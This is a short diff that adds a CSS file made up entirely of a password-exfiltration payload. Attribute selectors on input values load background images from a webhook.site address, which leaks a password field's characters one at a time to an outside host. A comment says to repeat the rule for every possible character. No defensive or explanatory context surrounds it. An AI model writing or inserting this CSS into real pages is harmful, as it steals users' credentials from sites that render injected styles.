@@ -1,0 +1,6 @@
+@import url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/start");
+
+/* Guess first character of password */
+input[value^="a"] { background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/a"); }
+input[value^="b"] { background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/b"); }
+/* Repeat for all characters in possible password */
